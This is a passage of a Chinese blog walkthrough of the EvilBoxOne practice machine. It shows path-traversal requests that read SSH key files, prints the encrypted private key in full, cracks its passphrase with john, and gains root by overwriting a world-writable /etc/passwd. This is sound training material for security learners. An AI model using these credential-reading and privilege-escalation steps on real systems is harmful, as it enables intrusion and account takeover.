class="symbol">debug1:</span> SSH2_MSG_NEWKEYS sent</span><br><span class="line"><span class="symbol">debug1:</span> expecting SSH2_MSG_NEWKEYS</span><br><span class="line"><span class="symbol">debug1:</span> SSH2_MSG_NEWKEYS received</span><br><span class="line"><span class="symbol">debug1:</span> rekey <span class="keyword">in</span> after <span class="number">134217728</span> blocks</span><br><span class="line"><span class="symbol">debug1:</span> Will attempt <span class="keyword">key</span>: /root/.ssh/id_rsa</span><br><span class="line"><span class="symbol">debug1:</span> Will attempt <span class="keyword">key</span>: /root/.ssh/id_dsa</span><br><span class="line"><span class="symbol">debug1:</span> Will attempt <span class="keyword">key</span>: /root/.ssh/id_ecdsa</span><br><span class="line"><span class="symbol">debug1:</span> Will attempt <span class="keyword">key</span>: /root/.ssh/id_ecdsa_sk</span><br><span class="line"><span class="symbol">debug1:</span> Will attempt <span class="keyword">key</span>: /root/.ssh/id_ed25519</span><br><span class="line"><span class="symbol">debug1:</span> Will attempt <span class="keyword">key</span>: /root/.ssh/id_ed25519_sk</span><br><span class="line"><span class="symbol">debug1:</span> Will attempt <span class="keyword">key</span>: /root/.ssh/id_xmss</span><br><span class="line"><span class="symbol">debug1:</span> SSH2_MSG_EXT_INFO received</span><br><span class="line"><span class="symbol">debug1:</span> kex_input_ext_info: server-sig-algs=&lt;ssh-ed25519,ssh-rsa,rsa-sha2-<span class="number">256</span>,rsa-sha2-<span class="number">512</span>,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521&gt;</span><br><span class="line"><span class="symbol">debug1:</span> SSH2_MSG_SERVICE_ACCEPT received</span><br><span class="line"><span class="symbol">debug1:</span> Authentications that can <span class="keyword">continue</span>: publickey,password</span><br><span class="line"><span class="symbol">debug1:</span> <span class="keyword">Next</span> authentication method: publickey</span><br><span class="line"><span class="symbol">debug1:</span> Trying <span class="keyword">private</span> <span class="keyword">key</span>: /root/.ssh/id_rsa</span><br><span class="line"><span class="symbol">debug1:</span> Trying <span class="keyword">private</span> <span class="keyword">key</span>: /root/.ssh/id_dsa</span><br><span class="line"><span class="symbol">debug1:</span> Trying <span class="keyword">private</span> <span class="keyword">key</span>: /root/.ssh/id_ecdsa</span><br><span class="line"><span class="symbol">debug1:</span> Trying <span class="keyword">private</span> <span class="keyword">key</span>: /root/.ssh/id_ecdsa_sk</span><br><span class="line"><span class="symbol">debug1:</span> Trying <span class="keyword">private</span> <span class="keyword">key</span>: /root/.ssh/id_ed25519</span><br><span class="line"><span class="symbol">debug1:</span> Trying <span class="keyword">private</span> <span class="keyword">key</span>: /root/.ssh/id_ed25519_sk</span><br><span class="line"><span class="symbol">debug1:</span> Trying <span class="keyword">private</span> <span class="keyword">key</span>: /root/.ssh/id_xmss</span><br><span class="line"><span class="symbol">debug1:</span> <span class="keyword">Next</span> authentication method: password</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>debug1: Authentications that can continue: publickey,password</code>表示可以通过秘钥或者密码认证。</p>
+<p>读取公钥</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.206</span><span class="regexp">/secret/</span>evil.php?command=..<span class="regexp">/../</span>..<span class="regexp">/../</span>home<span class="regexp">/mowree/</span>.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh</span>-rsa AAAAB<span class="number">3</span>NzaC<span class="number">1</span>yc<span class="number">2</span>EAAAADAQABAAABAQDAXfEfC<span class="number">22</span>Bpq<span class="number">40</span>UDZ<span class="number">8</span>QXeuQa<span class="number">6</span>EVJPmW<span class="number">6</span>BjB<span class="number">4</span>Ud/knShqQ<span class="number">86</span>qCUatKaNlMfdpzKaagEBtlVUYwit<span class="number">68</span>VH<span class="number">5</span>xHV/QIcAzWi+FNw<span class="number">0</span>SB<span class="number">2</span>KTYvS<span class="number">514</span>pkYj<span class="number">2</span>mqrONdu<span class="number">1</span>LQLvgXIqbmV<span class="number">7</span>MPyE<span class="number">2</span>AsGoQrOftpLKLJ<span class="number">8</span>JToaIUCgYsVPHvs<span class="number">9</span>Jy<span class="number">3</span>fka+qLRHb<span class="number">0</span>HjekPOuMiq<span class="number">19</span>OeBeuGViaqILY+w<span class="number">9</span>h<span class="number">19</span>ebZelN<span class="number">8</span>fJKW<span class="number">3</span>mX<span class="number">4</span>mkpM<span class="number">7</span>eH<span class="number">4</span>C<span class="number">46</span>J<span class="number">0</span>cmbK<span class="number">3</span>ztkZuQ<span class="number">9</span>e<span class="number">8</span>Z<span class="number">14</span>yAhcehde+sEHFKVcPS<span class="number">0</span>WkHl<span class="number">61</span>aTQoH/XTky<span class="number">8</span>dHatCUucUATnwjDvUMgrVZ<span class="number">5</span>cTjr<span class="number">4</span>Q<span class="number">4</span>YSvSRSIgpDP<span class="number">2</span>lNNs<span class="number">1</span>B<span class="number">7</span> mowree@EvilBoxOne</span><br></pre></td></tr></table></figure>
+
+<p>可以看见是rsa算法，于是可以读取私钥</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.206</span><span class="regexp">/secret/</span>evil.php?command=..<span class="regexp">/../</span>..<span class="regexp">/../</span>home<span class="regexp">/mowree/</span>.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+
+<p>私钥结果</p>
+<p><code>view-source:http://172.16.42.206/secret/evil.php?command=../../../../home/mowree/.ssh/id_rsa</code></p>
+<p>查看源码方式读取比较友好</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line">Proc-<span class="keyword">Type</span>: <span class="number">4</span>,<span class="keyword">ENCRYPTED</span></span><br><span class="line">DEK-<span class="keyword">Info</span>: DES-EDE3-CBC,<span class="number">9</span>FB14B3F3D04E90E</span><br><span class="line"></span><br><span class="line">uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6</span><br><span class="line">hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe</span><br><span class="line">o7+<span class="number">7</span>tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb</span><br><span class="line">+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+<span class="number">0</span>tOFsuot</span><br><span class="line">b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k</span><br><span class="line">HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg</span><br><span class="line"><span class="number">9</span>SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY</span><br><span class="line">zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu</span><br><span class="line">rRqnxYW/fzdJm+<span class="number">8</span>XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1</span><br><span class="line">tHBy6UOhKCn3H8edtXwvZN+<span class="number">9</span>PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs</span><br><span class="line"><span class="number">94</span>KATK4joOIW7O8GnPdKBiI+<span class="number">3</span>Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm</span><br><span class="line">VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7</span><br><span class="line">Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P</span><br><span class="line">hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+<span class="number">7</span>Shr</span><br><span class="line">Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR</span><br><span class="line">IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R</span><br><span class="line">MtqgW1L0iAgB4CnTIud6DpXQtR9l//<span class="number">9</span>alrXa+<span class="number">4</span>nWcDW2GoKjljxOKNK8jXs58SnS</span><br><span class="line"><span class="number">62</span>LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69</span><br><span class="line">Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+<span class="number">1</span>zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8</span><br><span class="line">p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C</span><br><span class="line">pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X</span><br><span class="line">KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa</span><br><span class="line">i99+vYdwe8+<span class="number">8</span>nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+<span class="number">6</span>qS/<span class="number">4</span>Q6DVVxTHdp</span><br><span class="line"><span class="number">4</span>Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/</span><br><span class="line"><span class="number">8</span>kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==</span><br><span class="line"><span class="comment">-----END RSA PRIVATE KEY-----</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>私钥登录:  创建一个id_rsa文件</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@kali</span> /tmp]<span class="meta"># vi id_rsa</span></span><br><span class="line">[root<span class="symbol">@kali</span> /tmp]<span class="meta"># chmod 600 id_rsa</span></span><br><span class="line">[root<span class="symbol">@kali</span> /tmp]<span class="meta"># ssh mowree@172.16.42.206 -i ./id_rsa</span></span><br></pre></td></tr></table></figure>
+
+<p>登录发现要输入key</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@kali</span> /tmp]<span class="meta"># ssh mowree@172.16.42.206 -i ./id_rsa</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;./id_rsa&#x27;</span>:</span><br></pre></td></tr></table></figure>
+
+<p>访问私钥也需要认证。</p>
+<p>这时候需要本地密码破解</p>
+<h3 id="ssh爆破"><a href="#ssh爆破" class="headerlink" title="ssh爆破"></a>ssh爆破</h3><ul>
+<li><p>将id_rsa转为john可识别格式。</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@kali john]# cd <span class="regexp">/usr/</span>share/john</span><br><span class="line">[root@kali john]# .<span class="regexp">/ssh2john.py /</span>tmp<span class="regexp">/id_rsa &gt; /</span>tmp/hash</span><br></pre></td></tr></table></figure></li>
+<li><p>生成字典</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@kali <span class="regexp">/tmp]# cp /u</span>sr<span class="regexp">/share/</span>wordlists<span class="regexp">/rockyou.txt.gz ./</span></span><br><span class="line">[root@kali /tmp]<span class="comment"># gunzip rockyou.txt.gz</span></span><br></pre></td></tr></table></figure></li>
+<li><p>开始爆破<code>john hash --wordlist=rockyou.txt</code></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@kali /tmp]# john hash <span class="comment">--wordlist=rockyou.txt</span></span><br><span class="line"><span class="keyword">Using</span> <span class="keyword">default</span> <span class="keyword">input</span> <span class="keyword">encoding</span>: UTF<span class="number">-8</span></span><br><span class="line">Loaded <span class="number">1</span> <span class="keyword">password</span> hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) <span class="number">32</span>/<span class="number">64</span>])</span><br><span class="line"><span class="keyword">Cost</span> <span class="number">1</span> (KDF/cipher [<span class="number">0</span>=MD5/AES <span class="number">1</span>=MD5/<span class="number">3</span>DES <span class="number">2</span>=Bcrypt/AES]) <span class="keyword">is</span> <span class="number">1</span> <span class="keyword">for</span> <span class="keyword">all</span> loaded hashes</span><br><span class="line"><span class="keyword">Cost</span> <span class="number">2</span> (iteration count) <span class="keyword">is</span> <span class="number">2</span> <span class="keyword">for</span> <span class="keyword">all</span> loaded hashes</span><br><span class="line">Will run <span class="number">4</span> OpenMP threads</span><br><span class="line">Note: This <span class="keyword">format</span> may emit <span class="keyword">false</span> positives, so it will keep trying even <span class="keyword">after</span></span><br><span class="line">finding a possible candidate.</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> <span class="keyword">or</span> Ctrl-C <span class="keyword">to</span> <span class="keyword">abort</span>, almost <span class="keyword">any</span> other key <span class="keyword">for</span> status</span><br><span class="line">unicorn          (/tmp/id_rsa)</span><br><span class="line"><span class="built_in">Warning</span>: <span class="keyword">Only</span> <span class="number">2</span> candidates left, minimum <span class="number">4</span> needed <span class="keyword">for</span> performance.</span><br><span class="line"><span class="number">1</span>g <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">08</span> DONE (<span class="number">2022</span><span class="number">-11</span><span class="number">-18</span> <span class="number">05</span>:<span class="number">18</span>) <span class="number">0.1142</span>g/s <span class="number">1639</span>Kp/s <span class="number">1639</span>Kc/s <span class="number">1639</span>KC/sa6_123..*<span class="number">7</span>¡Vamos!</span><br><span class="line"><span class="keyword">Session</span> completed</span><br></pre></td></tr></table></figure>
+
+<p>破解出了加密密码unicorn</p>
+</li>
+</ul>
+<p>再次登录</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="variable">@kali</span> /tmp]<span class="comment"># ssh mowree@172.16.42.206 -i ./id_rsa</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;./id_rsa&#x27;</span>:</span><br><span class="line">Linux EvilBoxOne <span class="number">4.19</span>.0<span class="number">-17</span>-amd64 <span class="comment">#1 SMP Debian 4.19.194-3 (2021-07-18) x86_64</span></span><br><span class="line">mowree<span class="variable">@EvilBoxOne</span><span class="symbol">:~</span>$</span><br></pre></td></tr></table></figure>
+
+<p>成功。</p>
+<p>第一个flag</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mowree<span class="variable">@EvilBoxOne</span><span class="symbol">:~</span><span class="variable">$ </span>cat user.txt</span><br><span class="line"><span class="number">56</span>Rbp0soobpzWSVzKh9YOvzGLgtPZQ</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mowree</span>@EvilBoxOne:~$ uname -a</span><br><span class="line"><span class="attribute">Linux</span> EvilBoxOne <span class="number">4</span>.<span class="number">19</span>.<span class="number">0</span>-<span class="number">17</span>-amd<span class="number">64</span> #<span class="number">1</span> SMP Debian <span class="number">4</span>.<span class="number">19</span>.<span class="number">194</span>-<span class="number">3</span> (<span class="number">2021</span>-<span class="number">07</span>-<span class="number">18</span>) x<span class="number">86</span>_<span class="number">64</span> GNU/Linux</span><br></pre></td></tr></table></figure>
+
+<p>搜索内核漏洞</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@kali</span> ~]<span class="meta"># searchsploit linux 4.19</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>没有利用成功</p>
+<h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><p>命令： <code>find / -perm /4000 2&gt;/dev/null</code></p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mowree@EvilBoxOne:~$ <span class="keyword">find</span> <span class="regexp">/ -perm /</span><span class="number">4000</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="keyword">null</span></span><br><span class="line"></span><br><span class="line"><span class="regexp">/usr/</span>lib<span class="regexp">/openssh/</span>ssh-keysign</span><br><span class="line"><span class="regexp">/usr/</span>lib<span class="regexp">/eject/</span>dmcrypt-get-device</span><br><span class="line"><span class="regexp">/usr/</span>lib<span class="regexp">/dbus-1.0/</span>dbus-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/</span>bin/mount</span><br><span class="line"><span class="regexp">/usr/</span>bin/newgrp</span><br><span class="line"><span class="regexp">/usr/</span>bin/passwd</span><br><span class="line"><span class="regexp">/usr/</span>bin/umount</span><br><span class="line"><span class="regexp">/usr/</span>bin/chfn</span><br><span class="line"><span class="regexp">/usr/</span>bin/chsh</span><br><span class="line"><span class="regexp">/usr/</span>bin/gpasswd</span><br><span class="line"><span class="regexp">/usr/</span>bin/su</span><br></pre></td></tr></table></figure>
+
+<p>没有可用的，都是默认的</p>
+<p>查看sgid</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mowree@EvilBoxOne:~$ <span class="keyword">find</span> <span class="regexp">/ -perm /</span><span class="number">2000</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="keyword">null</span></span><br><span class="line"><span class="regexp">/run/</span>log/journal</span><br><span class="line"><span class="regexp">/run/</span>log<span class="regexp">/journal/</span>e24bbdcfd6de4ae7a8b91fa945905e5b</span><br><span class="line"><span class="regexp">/usr/</span>sbin/unix_chkpwd</span><br><span class="line"><span class="regexp">/usr/</span>bin/bsd-<span class="keyword">write</span></span><br><span class="line"><span class="regexp">/usr/</span>bin/dotlockfile</span><br><span class="line"><span class="regexp">/usr/</span>bin/chage</span><br><span class="line"><span class="regexp">/usr/</span>bin/expiry</span><br><span class="line"><span class="regexp">/usr/</span>bin/wall</span><br><span class="line"><span class="regexp">/usr/</span>bin/crontab</span><br><span class="line"><span class="regexp">/usr/</span>bin/ssh-agent</span><br><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/lib/</span>python2.<span class="number">7</span></span><br><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/lib/</span>python2.<span class="number">7</span>/dist-packages</span><br><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/lib/</span>python2.<span class="number">7</span>/site-packages</span><br><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/lib/</span>python3.<span class="number">7</span></span><br><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/lib/</span>python3.<span class="number">7</span>/dist-packages</span><br><span class="line"><span class="regexp">/var/m</span>ail</span><br><span class="line"><span class="regexp">/var/</span>local</span><br></pre></td></tr></table></figure>
+
+<p>也没有异常。</p>
+<h3 id="写入文件提权"><a href="#写入文件提权" class="headerlink" title="写入文件提权"></a>写入文件提权</h3><p>找可写权限，并且排除掉proc目录（该目录太多了，扰乱视线）</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">find</span> <span class="regexp">/ -writable 2&gt;/</span>dev/<span class="keyword">null</span> | <span class="keyword">grep</span> -v proc</span><br></pre></td></tr></table></figure>
+
+<p>发现/etc/passwd可写入。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mowree@EvilBoxOne:~$ ls -l <span class="regexp">/etc/</span>passwd</span><br><span class="line">-rw-rw-rw- <span class="number">1</span> root root <span class="number">1398</span> ago <span class="number">16</span>  <span class="number">2021</span> <span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>
+
+<p>可用看见任何用户都是可写的。</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">mowree:</span><span class="symbol">x:</span><span class="number">1000</span><span class="symbol">:</span><span class="number">1000</span><span class="symbol">:mowree</span>,,,<span class="symbol">:/home/mowree</span><span class="symbol">:/bin/bash</span></span><br><span class="line"></span><br><span class="line">用户名称<span class="symbol">:</span>密码(安全考虑，linux都将密码放到另一个文件/etc/shadow)<span class="symbol">:</span>用户<span class="symbol">id:</span>组<span class="symbol">id:</span>其他信息<span class="symbol">:</span>主目录<span class="symbol">:</span>登录后默认shell</span><br></pre></td></tr></table></figure>
+
+<p>如果我们将x替换为密码，就可以生效。</p>
+<p>使用openssl生成123的密码，-1是指一种加密算法</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mowree<span class="variable">@EvilBoxOne</span><span class="symbol">:~</span><span class="variable">$ </span>openssl passwd <span class="number">-1</span></span><br><span class="line"><span class="symbol">Password:</span></span><br><span class="line">Verifying - <span class="symbol">Password:</span></span><br><span class="line"><span class="variable">$1</span><span class="variable">$ZDTsBsag</span><span class="variable">$KEzTiDFkq7JxWKpWltQ8h0</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>vi /etc/passwd将root账号密码替换成生成的密码</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root:</span><span class="variable">$1</span><span class="variable">$ZDTsBsag</span><span class="variable">$KEzTiDFkq7JxWKpWltQ8h0</span><span class="symbol">:</span>0<span class="symbol">:</span>0<span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>su到root用户</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mowree<span class="variable">@EvilBoxOne</span><span class="symbol">:~</span><span class="variable">$ </span>su root</span><br><span class="line">Contraseñ<span class="symbol">a:</span></span><br><span class="line"><span class="comment">#输入密码123</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取flag</span></span><br><span class="line">root<span class="variable">@EvilBoxOne</span><span class="symbol">:/home/mowree</span><span class="comment"># cd</span></span><br><span class="line">root<span class="variable">@EvilBoxOne</span><span class="symbol">:~</span><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+
+
+<p>读取flag</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@EvilBoxOne</span><span class="symbol">:~</span><span class="comment"># cat root.txt</span></span><br><span class="line"><span class="number">36</span>QtXfdJWvdC0VavlPIApUbDlqTsBM</span><br></pre></td></tr></table></figure>
+
+
+
+<p>读取成功</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%89%93%E9%9D%B6/" rel="tag"># 打靶</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A05-hard-socnet2/" rel="prev" title="打靶练习5-hard_socnet2">
+      <i class="fa fa-chevron-left"></i> 打靶练习5-hard_socnet2
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A07-Hakcer-Kid/" rel="next" title="打靶练习7-Hakcer_Kid">
+      打靶练习7-Hakcer_Kid <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-text">主机发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E5%85%A5%E4%BE%B5"><span class="nav-text">web入侵</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#gobuster%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-text">gobuster目录扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E6%95%B0fuzz"><span class="nav-text">参数fuzz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-text">测试文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-text">远程文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E5%B0%81%E8%A3%85%E5%99%A8"><span class="nav-text">php封装器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh%E7%A7%98%E9%92%A5%E8%8E%B7%E5%8F%96"><span class="nav-text">ssh秘钥获取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh%E7%88%86%E7%A0%B4"><span class="nav-text">ssh爆破</span></a></li></ol></li><li class="nav-item 